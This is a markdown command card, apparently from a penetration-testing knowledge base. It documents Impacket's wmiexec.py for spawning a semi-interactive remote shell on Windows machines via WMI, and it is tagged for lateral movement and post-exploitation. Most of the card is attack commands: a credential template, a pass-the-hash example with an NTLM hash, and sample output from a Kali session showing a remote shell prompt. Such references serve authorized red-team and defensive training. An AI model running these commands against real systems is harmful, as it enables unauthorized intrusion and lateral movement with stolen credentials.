---
type: command
executor: bash
data: 'wmiexec.py $_USERNAME:$_PASSWORD@$_TARGET_IP'
platforms:
  - Linux
tags:
  - lateral-movement
  - remote-execution
verified: true
validated: true
---

# wmiexec.py Spawn Semi-Interactive Shell

## Command

```bash
wmiexec.py $_USERNAME:$_PASSWORD@$_TARGET_IP
```

## Description

This command connects to a remote Windows target using the provided credentials and spawns a semi-interactive shell via WMI. It allows execution of multiple commands on the target, with output returned to the attacker's console. Use this for lateral movement or post-exploitation when you have valid domain or local credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | Username for authentication (domain\user or local user) | Yes |
| $_PASSWORD | Password or NTLM hash for the user (format: LMHASH:NTHASH if using hashes) | Yes |
| $_TARGET_IP | IP address or hostname of the target Windows machine | Yes |

Additional flags can be added for advanced usage, such as `-d DOMAIN` for domain specification or `-hashes` for hash-based auth.

## Examples

### Basic Usage

```bash
wmiexec.py bob:Password123@192.168.1.100
```

### Advanced Usage

```bash
wmiexec.py -d corp.local -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c bob@192.168.1.100
```

## Expected Output

```
root@kali:~# wmiexec.py bob:secretpass@10.10.10.10
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

INFO:root:SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\Windows\system32> 
```

The shell prompt (C:\Windows\system32>) indicates successful connection, allowing command input like `whoami` or `dir`.

## Related

- [[Related Procedure: Execute-Remote-Commands-via-WMI]]
- [[Related Tool: wmiexec-py-impacket]]
